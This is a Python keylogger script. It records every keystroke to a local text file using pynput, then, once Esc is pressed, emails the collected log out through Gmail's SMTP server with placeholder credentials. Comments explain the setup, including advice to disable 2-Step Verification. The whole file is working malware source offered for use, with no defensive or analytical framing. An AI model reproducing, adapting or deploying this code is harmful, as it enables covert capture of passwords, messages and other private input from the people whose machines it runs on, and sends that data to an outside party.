from pynput import keyboard  # To listen for keystrokes
import smtplib, ssl          # To send emails via SMTP
import time

# Email credentials and settings (Make sure 2-Step Verification is disabled, or use App passwords)
sender_mail = "user@example.com"  # Your email
receiver_mail = "user@example.com"  # Receiver email (can be the same as sender)
password = "your_password"  # Your email password (or app-specific password)
smtp_server = "smtp.gmail.com"
port = 587

# Prepare the message header
message = """From: Keylogger <user@example.com>
To: <user@example.com>
Subject: Key Logs

Text: Key logs attached below:
"""

# File to store the key logs
log_file = "keylogger.txt"

# Function to write keys to the file
def write(text):
    with open(log_file, 'a') as f:
        f.write(text)

# Function that will handle key presses
def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write("\n")
        elif key == keyboard.Key.space:
            write(" ")
        else:
            write(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        else:
            temp = repr(key) + " Pressed\n"
            write(temp)

# Function to stop logging when a specific key is pressed
def on_key_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop the listener

# Function to send the email with the logs
def send_email():
    # Read the content of the log file
    with open(log_file, 'r') as f:
        log_content = f.read()

    # Combine the message with the key logs
    full_message = message + log_content

    # Create the secure connection context
    context = ssl.create_default_context()

    try:
        # Connect to the SMTP server
        server = smtplib.SMTP(smtp_server, port)
        server.starttls(context=context)  # Secure the connection
        server.login(sender_mail, password)  # Login to your email
        server.sendmail(sender_mail, receiver_mail, full_message)  # Send the email
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error occurred: {e}")
    finally:
        server.quit()  # Close the connection

# Run the keylogger using the pynput listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()  # Start listening

# After the listener stops, send the logs via email
send_email()
